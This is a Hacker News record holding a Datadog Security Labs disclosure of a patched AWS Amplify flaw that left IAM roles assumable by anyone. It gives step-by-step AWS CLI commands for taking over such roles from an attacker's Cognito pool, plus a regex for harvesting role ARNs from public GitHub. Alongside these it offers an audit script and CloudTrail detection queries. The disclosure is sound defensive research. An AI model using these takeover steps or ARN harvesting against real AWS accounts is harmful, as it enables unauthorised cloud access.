{"aid": "40051879", "title": "Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover", "url": "https://securitylabs.datadoghq.com/articles/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/", "domain": "datadoghq.com", "votes": 1, "user": "DigitalDataDude", "posted_at": "2024-04-16 13:53:31", "comments": 0, "source_title": "Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover | Datadog Security Labs", "source_text": "Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to takeover | Datadog Security Labs\n\nresearch\n\n# Amplified exposure: How AWS flaws made Amplify IAM roles vulnerable to\ntakeover\n\nApril 15, 2024\n\n  * aws\n  * vulnerability disclosure\n\n  * twitter\n  * reddit\n\nNick Frichette\n\nStaff Security Researcher\n\n## Key Points\n\n  * We identified two variants of a vulnerability in AWS Amplify that exposed identity and access management (IAM) roles associated with Amplify projects, allowing them to become assumable by anyone in the world.\n  * If the authentication component was removed from an Amplify project using the Amplify CLI or Amplify Studio built between August 2019 and January 2024, the IAM roles associated with the project were publicly assumable.\n  * IAM roles associated with Amplify projects created using the Amplify CLI built between July 2018 and August 2019 had trust policies that allowed anyone in the world to assume them.\n  * The CLI vulnerability is tracked as CVE-2024-28056.\n  * On the same day we reported the vulnerability to them, AWS released a hotfix for the CLI to mitigate the issue in any newly created roles.\n  * AWS has rolled out enhancements to IAM to prevent the creation of vulnerable roles. Additionally, AWS has modified its Security Token Service (STS) to block cross-account role assumption of vulnerable roles. This vulnerability can no longer be exploited.\n\n## Timeline\n\n  * January 4, 2024: Datadog Security Research identifies the vulnerable behavior in AWS Amplify.\n  * January 9, 2024, 9 a.m. CST: Datadog Security Research contacts AWS with a proof of concept and technical details.\n  * January 9, 2024, 2:33 p.m. CST: AWS creates a PR to fix the vulnerability in the Amplify CLI.\n  * January 9, 2024, 10:13 p.m. CST: AWS releases version 12.10.1 of the Amplify CLI, ensuring that no future roles will be exposed.\n  * January 12, 2024: AWS releases a patch that fixes the version of the vulnerability in Amplify Studio, ensuring that no future roles will be exposed.\n  * January 17, 2024: Datadog Security Research releases two detections, AWS IAM role should not have permissive trust with the Cognito Identity service and AWS IAM role should not have permissive trust with the Cognito Identity service and \"FullAccess\" permissions, to protect customers impacted by this vulnerability and begins proactively contacting customers with privileged IAM roles that were vulnerable.\n  * February 28, 2024: AWS releases a patch to prevent an adversary assuming a role susceptible to the first variant of this vulnerability from a different AWS account.\n  * February 29, 2024: AWS releases a patch to prevent roles susceptible to the first variant from being created.\n  * March 5, 2024: Datadog Security Research meets with AWS to discuss the vulnerability. We disclose that variant two of the vulnerability is still exploitable.\n  * April 8, 2024: AWS releases a patch to prevent an adversary assuming a role susceptible to the second variant of this issue from a different AWS account.\n  * April 15, 2024: Datadog Security Research and AWS release coordinated disclosure (see AWS security bulletin).\n\n## Introduction\n\nOne of our core objectives is to explore, identify, and document new methods\nto attack cloud resources. On occasion, these efforts uncover vulnerabilities\nin those cloud services, and we work with cloud service providers to ensure\ntheir remediation.\n\nWe discovered a vulnerability in AWS Amplify that caused Cognito IAM roles\nassociated with the service to become assumable by anyone in the world. In\naddition, when these roles were publicly exposed, they retained the privileges\nthey had before the exposure.\n\nIn this article, we will examine vulnerable configurations for IAM roles with\na trust relationship to the Cognito Identity service, how we uncovered a\nvulnerability in AWS Amplify that exposed these roles to be assumable by\nanyone, and how this finding impacts Amplify users.\n\n## Background\n\nIn order to demonstrate the impact of the vulnerability, we will describe how\nwe discovered this behavior.\n\nAmazon Cognito is a \"sign-in-as-a-service\" offering from AWS, enabling\ndevelopers to shift the effort of developing an authentication system and\nsecurely storing user credentials to AWS.\n\nOne of the major features of Cognito is identity pools, which allow developers\nto authorize authenticated or anonymous users to access AWS resources.\nIdentity pools can issue standard short-lived STS credentials (access keys)\nfor those users.\n\nTo do this, Cognito creates a role in the AWS account with a role trust policy\nthat looks similar to the following (this example is specifically for an\nauthenticated Cognito role):\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\", \"Condition\": { \"StringEquals\": { \"cognito-identity.amazonaws.com:aud\": \"us-east-1:00000000-aaaa-1111-bbbb-222222222222\" }, \"ForAnyValue:StringLike\": { \"cognito-identity.amazonaws.com:amr\": \"authenticated\" } } } ] }\n\nThe most important part of this policy is the Condition element. Without this\ncondition, the trust relationship with the cognito-identity.amazonaws.com\nservice could have allowed anyone in the world to assume this role, as we show\nin the following sections.\n\n### Potential misconfiguration 1: Trust policy without a condition\n\nIn order to assume an IAM role with a misconfigured role trust policy we first\nhave to convince the Cognito service to assume the role on our behalf. Under\nmost circumstances, this is not possible. As an example, if you create an\nidentity pool or modify an existing one and attempt to specify an\nunauthenticated role in a different account you will receive the following\nerror message:\n\n    \n    \n    nick.frichette@host % aws cognito-identity set-identity-pool-roles \\ --identity-pool-id us-east-1:11111111-aaaa-2222-bbbb-333333333333 \\ --roles unauthenticated=arn:aws:iam::222222222222:role/role-in-different-aws-account An error occurred (AccessDeniedException) when calling the SetIdentityPoolRoles operation: Cross-account pass role is not allowed.\n\nHowever, we identified a method to assume a role with a misconfigured trust\npolicy by using Cognito\u2019s Basic (classic) authflow. The final step in this\nauthentication flow is to perform an sts:AssumeRoleWithWebIdentity API call.\nsts:AssumeRoleWithWebIdentity takes an IAM role\u2019s Amazon Resource Name (ARN)\nas a parameter, allowing us to specify a vulnerable role in a different AWS\naccount. Crucially, specifying a role belonging to a different AWS account did\nnot return an error.\n\nA hypothetical attacker was able to assume an IAM role with a misconfigured\nrole trust policy by creating their own identity pool in their attacker-\ncontrolled account. The attacker would then generate the identity token\nrequired for the sts:AssumeRoleWithWebIdentity API call using their own\nidentity pool and provide the ARN of the role in the victim account.\n\nAssuming a role in another account using an attacker controlled identity pool\n\nTo demonstrate how an attacker could take advantage of this, consider the\nfollowing example of a misconfigured role trust policy on a role with the ARN\narn:aws:iam::111111111111:role/vulnerable_role:\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\" } ] }\n\nThis policy, without the aforementioned Condition element to protect it, would\npermit any Cognito Identity pool the ability to assume the role, including\nthose outside the role\u2019s account. No further authentication or authorization\nwas required. From a separate account that they control, an attacker could\nperform the following steps to assume the role.\n\n  1. Create an attacker-controlled Cognito Identity pool. a. aws cognito-identity create-identity-pool --identity-pool-name attacker_id_pool --allow-classic-flow --allow-unauthenticated-identities b. This will return an IdentityPoolId, which will be used in the next step.\n  2. Generate a Cognito IdentityId using the ID from the previous step. a. aws cognito-identity get-id --identity-pool-id <IdentityPoolId from step 1> b. This will return an IdentityId that will be used in the next step.\n  3. Generate a Cognito web identity token. a. aws cognito-identity get-open-id-token --identity-id <IdentityId from step 2> b. This will return a Token that will be used in the next step.\n  4. Assume the role in the victim\u2019s account using sts:AssumeRoleWithWebIdentity. a. aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111111111111:role/vulnerable_role --role-session-name hacked --web-identity-token <Token from step 3>\n\nFollowing these steps would generate short-lived STS credentials for the\nvulnerable role in the victim\u2019s account, allowing an adversary to access and\ninteract with all resources to which the role had privileges.\n\n    \n    \n    nick.frichette@host % aws sts get-caller-identity { \"UserId\": \"AROAEXAMPLEEXAMPLE123:hacked\", \"Account\": \"111111111111\", \"Arn\": \"arn:aws:sts::111111111111:assumed-role/vulnerable_role/hacked\" }\n\n### Potential misconfiguration 2: Trust policy with an unauthenticated\ncondition\n\nIt is important to note that the process described in misconfiguration #1\nwould also work when there was an empty Condition element or one where the\ncognito-identity.amazonaws.com:amr condition was set to unauthenticated. Here\nis an example policy:\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\", \"Condition\": { \"ForAnyValue:StringLike\": { \"cognito-identity.amazonaws.com:amr\": \"unauthenticated\" } } } ] }\n\nThis was because IAM was only comparing the condition against the attacker-\ncontrolled identity pool, not the pool the victim role was originally\nconfigured for. This behavior allowed us to authenticate to IAM roles that had\nan authenticated condition as well.\n\n### Potential misconfiguration 3: Trust policy with an authenticated condition\n\nThe process to assume a role that had an authenticated cognito-\nidentity.amazonaws.com:amr condition required an extra step in the form of\ncreating an attacker-controlled Cognito user pool to authenticate against.\nWhile this took an extra bit of time, the overall process was still\nstraightforward.\n\nThis example assumes you had already created a Cognito user pool in an\nattacker-controlled AWS account and created a user for it. We also assume you\nwere targeting a role with a trust policy similar to the following:\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\", \"Condition\": { \"ForAnyValue:StringLike\": { \"cognito-identity.amazonaws.com:amr\": \"authenticated\" } } } ] }\n\n  1. Authenticate to the attacker-controlled user pool. a. aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id <attacker controlled client id> \\--auth-parameters USERNAME=<username>,PASSWORD=<password> b. This will return an IdToken that will be used in the next step.\n  2. Generate a Cognito IdentityId. a. aws cognito-identity get-id --identity-pool-id <attacker controlled identity pool id> \\--logins '{\"cognito-idp.us-east-1.amazonaws.com/<attacker controlled user pool id>\":\"<IdToken from step 1>\"}' b. This will return an IdentityId that will be used in the next step.\n  3. Generate a Cognito web identity token. a. aws cognito-identity get-open-id-token --identity-id <identityId from step 2> \\--logins '{\"cognito-idp.us-east-1.amazonaws.com/<attacker controlled user pool id>\":\"<IdToken from step 1>\"}' b. This will return a Token that will be used in the next step.\n  4. Assume the role using sts:AssumeRoleWithWebIdentity. a. aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111111111111:role/vulnerable_role --role-session-name hacked --web-identity-token <Token from step 3>\n\n## Finding vulnerable roles\n\nIn the previous section, we described different types of misconfigurations\nthat could impact IAM roles used by Amazon Cognito. To be clear, these were\nnot vulnerabilities in Amazon Cognito, only risky misconfigurations. As part\nof this research project, we also wanted to understand how common these\nmisconfigurations were in the wild and, if possible, report vulnerable roles\nto organizations so they could be fixed. We implemented a quick search using\npublicly available data.\n\n### Searching for targets\n\nIn order to assume a vulnerable role, we need the Amazon Resource Name (ARN)\nof that role. There are a number of techniques to achieve this, including:\n\n  * Brute-forcing IAM roles from known account IDs\n  * Enumerating a principal\u2019s ARN from a unique identifier\n  * Leveraging search engines and data aggregators to search for publicly known ARNs\n\nSimilar to the work we have previously published on misconfigured GitHub\naction role trust policies, we used Sourcegraph to search through public\nGitHub repositories using a regular expression:\n\n    \n    \n    /arn:aws:iam::[0-9]{12}:role\\/[\\/a-zA-Z0-9-_]+/ count:all archived:yes fork:yes context:global\n\nUsing this approach, and removing duplicate or placeholder ARNs, we were able\nto gather over 8,000 role ARNs in a matter of minutes.\n\n### Results: Finding misconfigured roles in the wild\n\nTo test if a particular IAM role was vulnerable, we programmatically attempted\nto assume it using our own Cognito identity pool. We performed this twice for\neach role to account for the fact that the cognito-identity.amazonaws.com:amr\ncondition could be set to either authenticated or unauthenticated, if it\nexisted.\n\nWe were able to write a script that would check for vulnerable roles and\nindicate if they were vulnerable. This entire process took approximately five\nminutes.\n\nAs we began looking over the results, however, we uncovered interesting\nfindings. Over 90 percent of the vulnerable roles had similar names across a\nvariety of AWS accounts. The following are some examples that we modified to\nprotect their owners, but also to demonstrate the similarity.\n\n  * communicationclient-master-20190713239617-authRole\n  * chatamber-20181621961321-authRole\n  * ml-yeti-ui-dev-20191316145242-unauthRole\n  * aerodeploy-master-132847-authRole\n  * liveconveyance-dev-175294-unauthRole\n\nThese vulnerable roles almost all ended in either authRole or unauthRole. In\naddition, some role names appeared to include timestamps dating back to 2018,\nwhile others (presumably more recent ones) included six-digit integers to keep\nthem unique.\n\nAnother interesting result was that some vulnerable roles belonged to AWS\nthemselves. We found three such roles in the AWS Samples GitHub organization.\n\n  * arn:aws:iam::929881370398:role/amplify-awsassistant-sampledev-144248-authRole\n  * arn:aws:iam::098305555551:role/amplify-livetranslation-dev-165918-unauthRole\n  * arn:aws:iam::098305555551:role/amplify-livetranslation-dev-165918-authRole\n\nAfter uncovering misconfigured roles, we asked the question: What was it about\nthese roles that made them more likely to be vulnerable?\n\n## Tracking down the root cause\n\nWe began our search by looking at where these vulnerable roles were located. A\nlarge portion of them were in files called team-provider-info.json. A Google\nsearch informed us that these files are associated with another AWS service\nnamed Amplify.\n\nAmplify is a popular AWS service that makes it easy to develop mobile and web\napplications. It acts as a framework that allows you to focus on writing code,\nwhile Amplify automatically creates and configures infrastructure for your\napplication. This means that Amplify will deploy and configure resources in\nyour AWS account.\n\nTo explore the service we created an Amplify project. This added two IAM roles\nin our account named:\n\namplify-secrestesting-dev-134733-authRole amplify-secrestesting-\ndev-134733-unauthRole\n\nNow, we knew where these roles were coming from (Amplify)! But how were they\nbecoming misconfigured?\n\n### How Amplify exposed IAM roles to takeover: Variant one\n\nBy default, when Amplify creates these auth and unauth roles in your account,\nthey have a role trust policy that looks like the following:\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"\", \"Effect\": \"Deny\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\" } ] }\n\nWhile this may look similar to the vulnerable configuration we noted\npreviously, it is important to point out that the Effect is set to Deny. This\nprevents someone from being able to assume the role, so it is safe.\n\nAs a part of the Amplify service, you can add an authentication component to\nyour application, allowing you to add features such as user sign-up and sign-\nin. On the backend, Amplify will deploy and configure Amazon Cognito on your\nbehalf. This authentication component will use the previously created auth and\nunauth roles for the Amplify project. The auth role is for users who are\nauthenticated to the Amplify app, while the unauth role is for unauthenticated\nusers.\n\nThis process can be done either using the Amplify Studio (a console interface\nfor Amplify apps) or through the Amplify CLI with the following command:\n\n    \n    \n    $ amplify add auth\n\nAdding the authentication component from Amplify Studio\n\nWhen this occurs, Amplify will configure the role trust policy of the auth and\nunauth roles to be similar to the following:\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\", \"Condition\": { \"StringEquals\": { \"cognito-identity.amazonaws.com:aud\": \"<Cognito Identity Pool Id>\" }, \"ForAnyValue:StringLike\": { \"cognito-identity.amazonaws.com:amr\": \"<authenticated || unauthenticated>\" } } } ] }\n\nAgain, this role trust policy is safe. It enforces which identity pool can be\nused to assume the role.\n\nNow, if at any time you chose to remove the authentication component from your\nAmplify app, Amplify would delete those Cognito resources on the backend and\nmodify the role trust policy of both the auth and unauth roles. It would\nmodify the role trust policy to the following:\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\" } ] }\n\nWe've found it! This is the vulnerable configuration that, as we previously\ndemonstrated, made a role assumable by anyone in the world. Any user who\nremoved the authentication component from their Amplify project for any\nreason, intentional or not, would have the role trust policy changed to be\nopen to the world. Especially for the authRole, this is explicitly not what\ndevelopers would intend. Both the Amplify Studio and Amplify CLI exhibited\nthis behavior.\n\nIn speaking with customers who were affected, we found the most common reason\nthey removed this component was because a project started with the built-in\nCognito resources, then later moved to an external (i.e., outside of Amplify)\nCognito user or identity pool, or to a separate identity provider entirely.\nAmplify users were given no indication that an AWS service or tool was\nexposing their IAM roles in this way.\n\nWe will refer to this version of the vulnerability (without a Condition\nelement) as \"variant one\" for the remainder of this article.\n\nOne challenge of cloud security research is that the services offered by cloud\nproviders are often opaque. They take inputs and return outputs. Any changes\nto this are usually invisible to outside observers and researchers. However,\nthis is a rare circumstance in which the vulnerable component is in an open\nsource library, and as a result, we can track down when this vulnerable\nbehavior was introduced.\n\nBy looking at the commit history of the Cloudformation template in the Amplify\nCLI, it appears that this vulnerability was introduced in August 2019. In\nspeaking with the team at AWS, we learned that the Amplify Studio makes use of\nparts of the CLI. Based on this fact, the timeline of the fixes for both, and\nthat both displayed the same vulnerable behavior at time of discovery, it is\nsafe to assume that the Amplify Studio was also affected around that time.\n\n### Variant two\n\nAfter contacting AWS, we began identifying Datadog customers who had\nvulnerable IAM roles that could be taken over and proactively reaching out to\nthem.\n\nWhile investigating this, we noticed a strange trend. While the majority of\nvulnerable roles featured the variant one trust policy above, many featured a\ndifferent but just as vulnerable policy (which we will refer to as \"variant\ntwo\"):\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"\", \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\", \"Condition\": { \"ForAnyValue:StringLike\": { \"cognito-identity.amazonaws.com:amr\": \"authenticated\", } } } ] }\n\nMisconfigurations with variant two could have either authenticated or\nunauthenticated for the value of cognito-identity.amazonaws.com:amr and\nfeatured the same naming convention of ending in authRole or unauthRole.\n\nThe problem, however, was that we could not determine what was causing roles\nto be misconfigured in this way. We exhausted every possible functionality of\nAmplify and considered the possibility that it was a combination of two or\nmore factors, but none of these efforts resulted in a misconfigured policy\nthat featured the vulnerable Condition element.\n\nAfter spending time trying to identify what was making IAM roles vulnerable to\nvariant two, we took a different approach: We produced a list of all roles we\ncould find that were vulnerable to this variant and noticed that none of the\nroles featured the (presumably newer) six-digit identifier. Additionally, the\nmost recent timestamp we found vulnerable to variant two was from July 2019.\nThis was, crucially, a single month before the commit we identified that made\nIAM roles vulnerable to variant one.\n\nThis information suggested that the misconfiguration may have been older than\noriginally thought. Indeed, on July 3, 2018, a commit was made that set the\ndefault role trust policy for the auth and unauth roles to match what we found\nin variant two.\n\n    \n    \n    [... snip ...] \"AuthRole\": { \"Type\": \"AWS::IAM::Role\", \"Properties\": { \"RoleName\": {\"Ref\": \"AuthRoleName\"}, \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"\", \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\", \"Condition\": { \"ForAnyValue:StringLike\": { \"cognito-identity.amazonaws.com:amr\": \"authenticated\" } } [... snip ...]\n\nThis is important because, unlike variant one, there were no additional steps\nrequired to make an IAM role vulnerable. The \"variant two\" misconfiguration\nwas the default, out-of-the-box configuration for both auth and unauth roles.\nIf you created an Amplify project using the Amplify CLI built between July 3,\n2018 and August 8, 2019, your Amplify project\u2019s IAM roles were assumable by\nanyone in the world.\n\nOn August 8, 2019, a commit was made that unintentionally fixed the behavior\ncreating IAM roles vulnerable to variant two. This corroborates our earlier\nfinding that roles that were vulnerable to variant two did not have timestamps\nbeyond July 2019.\n\nUnlike with variant one, we cannot definitively say that the Amplify Studio\ncreated roles vulnerable to variant two. While we believe there is strong\nevidence to assume this, considering how close the two are and the fact that\nthese changes correlate to the right time period, the behavior was no longer\npresent by the time we were able to investigate.\n\n## Compounding factors increasing severity\n\nFor an adversary looking to break into an AWS account, finding publicly\nexposed IAM roles provides initial access to an AWS environment without any\nauthentication or authorization. The misconfiguration that AWS Amplify caused\nis similar to a wildcard Principal in a role trust policy with an extra step.\n\nWith this in mind, three compounding factors made this particular\nvulnerability even more severe.\n\n### 1\\. Amplify roles maintained their privileges after authentication was\nremoved\n\nWhen Amplify modified the role trust policy to allow anyone to assume these\nroles in a victim account, it did not modify the IAM policies associated with\nthose roles. If a role had privileges to call an API, access an S3 bucket, or\nread from a DynamoDB table, it could still perform those tasks. In addition,\nAmplify users could manually modify these IAM roles and attach arbitrary IAM\npolicies to them. Across Datadog customers, we found vulnerable IAM roles that\nhad a variety of \"full access\" policies attached, including AmazonS3FullAccess\nand AmazonKinesisFullAccess.\n\nBecause AWS exposed these roles such that anyone in the world could assume\nthem, and because the roles maintained their privileges, an adversary abusing\nthis vulnerability would not only have initial access to the AWS account\u2014they\nwould also have privileges over resources under the purview of those roles.\n\n### 2\\. Potentially vulnerable role ARNs are easily discoverable\n\nThe second factor that increased the likelihood of exploitation is the nature\nof Amplify and Cognito identity pools. In order to assume the role, an\nadversary would need to know that role\u2019s ARN. While an ARN is not considered a\nsecret in the same way a password or API key is, finding an ARN is still a\nchallenge that an attacker needs to solve. If this issue impacted any IAM\nrole, an adversary would need to enumerate the ARN through some of the methods\nwe\u2019ve already described, or search for ARNs after gaining a foothold in a\nvictim environment.\n\nHowever, the nature of Amplify and Cognito identity pools reduces the effort\ninvolved in gathering large numbers of IAM role ARNs. These roles are designed\nfor users of Amplify applications and intended to be distributed publicly.\nFurthermore, a motivated adversary could have simply crawled the internet for\nAmplify/Cognito-enabled applications, pulled role ARNs or identity pool IDs\nfrom their associated JavaScript, and tested if they were vulnerable.\nAdditionally, the role names are (by default) deterministic. If you find an\nunauthRole from a victim application, you will know the role ARN of the\nauthRole.\n\nAs an example of how this could quickly be scaled, an adversary could\nprogrammatically search Google for Amplify apps based on their domain. In a\nquick search, an adversary could find tens of thousands of applications to\ncheck for vulnerable roles.\n\nFinding Amplify apps using Google\n\nWhile not every Amplify app would have been vulnerable, an attacker would be\nlikely to find vulnerable roles over a large enough dataset.\n\nAndres Riancho explored another potential method for accumulating role ARNs in\nhis 2019 Black Hat USA talk, \"Internet-Scale Analysis of AWS Cognito\nSecurity\". He describes his methodology of finding large numbers of Cognito\nidentity pool IDs by searching through Common Crawl data, an archive of\ninternet content.\n\n### 3\\. Exposure started years ago\n\nAs mentioned earlier, both variants of this issue have been around for years.\nBecause of this, an unknown number of IAM roles could have been made\nvulnerable in that time and could have been used to gain initial access to AWS\norganizations that had them.\n\n## An example of how this could be exploited\n\nFor a practical example of how an adversary could exploit this vulnerability\nprior to AWS mitigation efforts, imagine a hypothetical document storage\napplication. This application can authenticate users via single sign-on and\nrequires MFA. Once authenticated, users can upload documents to S3 via the web\napplication and interact with API gateways that authenticate using IAM\ncredentials.\n\nAn example Amplify app using Cognito\n\nHowever, because of this vulnerability, if the authentication component was\nremoved from the Amplify project\u2014which could occur while moving to a new\nidentity provider, as mentioned previously\u2014Amplify would modify the IAM role\u2019s\ntrust policy to be open to the world:\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\" } ] }\n\nFrom here, an adversary could follow the steps we covered in the \"Potential\nmisconfiguration 1: Trust policy without a condition\" section above. They\ncould create an Identity pool in their own account and use\nsts:AssumeRoleWithWebIdentity to assume the vulnerable IAM role. No further\nauthentication or authorization would be required.\n\nExploiting a vulnerable Amplify app\n\n## AWS response\n\nAs a result of our research and subsequent disclosure, AWS released fixes in\nearly January to Amplify to ensure that it no longer created misconfigured\nroles. However, this did not resolve the problem that there were an unknown\nnumber of IAM roles out there that were already made vulnerable.\n\nIn late February, AWS rolled out an enhancement to its Security Token Service\n(STS) that makes exploiting roles with variant one misconfigured trust\npolicies no longer possible in cross-account scenarios. As an example,\nattempting to assume a role with the following trust policy will return an\nerror.\n\n    \n    \n    { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"cognito-identity.amazonaws.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\" } ] }\n    \n    \n    nick.frichette@host % aws sts assume-role-with-web-identity \\ --role-arn arn:aws:iam::111111111111:role/vulnerable-authRole \\ --role-session-name blah \\ --web-identity-token [truncated] An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation: Not authorized to perform sts:AssumeRoleWithWebIdentity\n\nThis change ensured that customers who unknowingly had vulnerable roles in\ntheir accounts could not be exploited. Additionally, AWS added an extra check\nto prevent customers (or even other software layers such as Amplify) from\ncreating this class of vulnerable role entirely.\n\nBlocked vulnerable policy\n\nLater, in April, AWS added an additional STS enhancement that protects against\ncross-account role assumption of roles that are misconfigured with variant\ntwo. Now, if a role is misconfigured with a Condition element for cognito-\nidentity.amazonaws.com:amr, customers will not be able to assume the role.\n\n## How to know if you're affected\n\nIf your organization uses AWS Amplify or has in the past, we recommend\nperforming an audit of your roles and potential threat activity via the steps\nbelow.\n\n### Identifying vulnerable IAM roles\n\nTo easily determine if an IAM role was vulnerable in your account, you can use\nthe following Python script to check. Ensure that your shell has credentials\nconfigured.\n\n    \n    \n    #!/usr/bin/env python3 import boto3 client = boto3.client('iam') roles = [role for result in client.get_paginator('list_roles').paginate() for role in result['Roles'] ] vulnerable_roles = [] for role in roles: assume_role_policy_statements = role['AssumeRolePolicyDocument']['Statement'] for statement in assume_role_policy_statements: if statement['Effect'] != 'Allow': continue if \"Federated\" not in statement['Principal'].keys(): continue if statement['Principal']['Federated'] != \"cognito-identity.amazonaws.com\": continue if statement['Action'] != \"sts:AssumeRoleWithWebIdentity\": continue vulnerable_condition = False if \"Condition\" not in statement.keys(): vulnerable_condition = True elif statement['Condition'] == {}: vulnerable_condition = True else: vulnerable_condition = True for condition_element in statement['Condition']: if \"cognito-identity.amazonaws.com:aud\" in statement['Condition'][condition_element].keys(): vulnerable_condition = False if vulnerable_condition: vulnerable_roles.append(role['Arn']) if len(vulnerable_roles) == 0: print(\"No vulnerable roles found\") else: print(f'Found {len(vulnerable_roles)} vulnerable roles:\\n') for role in vulnerable_roles: print(role)\n\n### Identifying vulnerable identity pools\n\nIt is important to note that while you can no longer assume a role that is\nvulnerable to variant one or two from an external AWS account, you can still\nassume those roles using an identity pool in the same account. If your AWS\naccount has a vulnerable role and an identity pool with the basic authflow\nenabled, an adversary could potentially use that pool via\nsts:AssumeRoleWithWebIdentity to assume the vulnerable role, resulting in\npotential privilege escalation.\n\nFor this reason, we recommend disabling the basic (classic) authflow for\nidentity pools.\n\n### Identifying threat actor activity in your environment\n\nIf an external adversary attempted to assume a role in your AWS account using\nthis technique, the activity would generate an sts:AssumeRoleWithWebIdentity\nCloudTrail event. This event would contain the following elements:\n\n    \n    \n    { \"userIdentity\": { \"Type\": \"WebIdentityUser\", \"identityProvider\": \"cognito-identity.amazonaws.com\", \"principalId\": \"cognito-identity.amazonaws.com:<identity pool id>:<identity id>\", \"userName\": \"<identity id>\" }, \"responseElements\": { \"assumedRoleUser\": { \"arn\": \"arn:aws:sts::111111111111:assumed-role/victim-role/hacked\", \"assumedRoleId\": \"AROAEXAMPLEEXAMPLEEXA:hacked\" }, \"audience\": \"<identity pool id>\", [...snip...]\n\nThe userIdentity.identityProvider would be cognito-identity.amazonaws.com,\nwhich indicated that a role had been assumed through the Cognito Identity\nservice. These CloudTrail events include the ID of the identity pool as\nresponseElements.audience. If the identity pool ID included in the CloudTrail\nevent does not belong to your AWS account, this may be an indicator that an\nattacker has assumed a role in your account.\n\n## How Datadog can help\n\nAfter identifying this vulnerability and the risk it posed, we released two\ndetection rules for Datadog Cloud Security Management (CSM) Misconfigurations\non January 17, 2024: \"AWS IAM role should not have permissive trust with the\nCognito Identity service\", and \"AWS IAM role should not have permissive trust\nwith the Cognito Identity service and \u2018FullAccess\u2019 permissions\". We also\nproactively notified several customers that were affected by this issue and\nhad privileged roles that were exposed. We also contacted customers we\nidentified as being vulnerable due to publicly accessible role ARNs.\n\nCSM Misconfigurations view\n\nIf you are a Datadog Cloud Security Management (CSM) customer, you can view\nthe January 17 Security Center post to view impacted resources, or you can\nview any affected IAM roles in your AWS accounts by clicking on this link.\n\nIn addition, you can search your CloudTrail logs for potentially malicious\nsts:AssumeRoleWithWebIdentity calls using the following logs query:\n\n    \n    \n    @eventSource:sts.amazonaws.com @evt.name:AssumeRoleWithWebIdentity @userIdentity.identityProvider:cognito-identity.amazonaws.com\n\nAs mentioned previously, it is still possible for an adversary to use an\nexisting identity pool in your account to assume a vulnerable role by taking\nadvantage of the basic (classic) authflow. To view any Cognito identity pools\nwith this misconfiguration in your AWS accounts, you can use this view in CSM.\n\n## Conclusion\n\nIn this post, we looked at how an adversary could abuse an IAM role\u2019s\nmisconfigured trust policy to gain initial access to an AWS account. We found\na vulnerability in a popular AWS service, Amplify, that exposed IAM roles\nassociated with Amplify projects to be assumed by anyone in the world.\nFinally, we took a look at how organizations can respond to this threat to\ndetermine if they may have been exposed and take action to remediate the\nissue.\n\n  * twitter\n  * reddit\n\n## Did you find this article helpful?\n\n## Related Content\n\nresearch\n\nAn analysis of a TeamTNT doppelg\u00e4nger\n\nresearch\n\nA confused deputy vulnerability in AWS AppSync\n\nresearch\n\nBypassing CloudTrail in AWS Service Catalog, and Other Logging Research\n\n## work with us\n\nWe're always looking for talented people to collaborate with\n\nfeatured positions\n\n  * Continuous Monitoring, Manager I\n\nSecurity - Engineering\n\n  * Detection Engineer 2 - CSM\n\nSecurity - Engineering\n\n  * Detection Engineer 2 - CSM (Lisbon)\n\nSecurity - Engineering\n\n  * Security Engineer II - Vulnerability Analysis\n\nSecurity - Engineering\n\n  * Security Engineer II - Vulnerability Management\n\nSecurity - Engineering\n\n  * Security Engineer, Trust & Safety - Internal Trust\n\nSecurity - Engineering\n\nWe have 11 positions\n\nview all\n\n\u00a9 Datadog 2024\n\n", "frontpage": false}
